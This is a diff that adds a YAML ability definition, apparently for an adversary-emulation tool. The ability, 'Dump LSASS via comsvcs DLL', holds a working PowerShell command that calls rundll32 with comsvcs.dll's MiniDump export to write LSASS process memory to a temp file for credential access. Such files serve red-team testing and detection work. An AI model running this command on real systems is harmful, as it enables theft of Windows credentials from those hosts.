@@ -1,0 +1,22 @@
+id: 168b2b96-1413-4596-aef7-483b20f8210e
+name: Dump LSASS via comsvcs DLL
+description: >-
+  This procedure uses rundll32.exe to call the MiniDump exported function of
+  comsvcs.dll, which in turns calls MiniDumpWriteDump to dump the memory of the
+  LSASS process.
+tactic: credential-access
+technique:
+  id: T1003.001
+  name: LSASS Memory
+platforms:
+  windows:
+    psh:
+      command: >-
+        Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe
+        C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id
+        $env:TEMP\\lsass.dmp full}
+metadata:
+  authors:
+    - bfuzzy1
+  tags: []
+  version: 1
